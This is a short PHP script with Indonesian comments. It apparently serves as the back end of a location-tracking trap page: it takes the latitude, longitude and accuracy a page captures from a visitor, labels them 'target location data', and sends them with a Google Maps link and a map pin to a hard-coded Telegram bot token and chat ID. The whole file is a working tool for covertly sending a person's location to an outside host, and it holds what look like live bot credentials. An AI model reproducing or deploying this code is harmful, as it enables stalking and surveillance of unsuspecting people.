<?php
// 1. Pengaturan Bot Telegram Anda
$token = "8723217533:AAH0-PhgEwjiiv1cZ5uA0K0w_oG_MBXcjQw";
$chat_id = "8039919095";

// 2. Memeriksa apakah parameter koordinat dikirim oleh halaman web
if (isset($_GET['lat']) && isset($_GET['lon'])) {
    $lat = $_GET['lat'];
    $lon = $_GET['lon'];
    $acc = isset($_GET['acc']) ? $_GET['acc'] : 'Tidak diketahui';
    $waktu = date('Y-m-d H:i:s');

    // 3. Menyusun format teks pesan
    $pesan = "--- DATA LOKASI TARGET ---\n";
    $pesan .= "Waktu : " . $waktu . "\n";
    $pesan .= "Latitude : " . $lat . "\n";
    $pesan .= "Longitude : " . $lon . "\n";
    $pesan .= "Akurasi : " . $acc . " meter\n\n";
    $pesan .= "Google Maps : https://www.google.com/maps/place/" . $lat . "," . $lon;

    // 4. Mengirim Pesan Teks Detail ke Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $pesan]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);

    // 5. Mengirim Peta Interaktif (Pin Lokasi) ke Telegram
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendLocation");
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'latitude' => $lat, 'longitude' => $lon]));
    curl_exec($ch);
    
    curl_close($ch);
    echo "Sukses Terkirim";
} else {
    echo "Error: Parameter koordinat tidak lengkap.";
}
?>

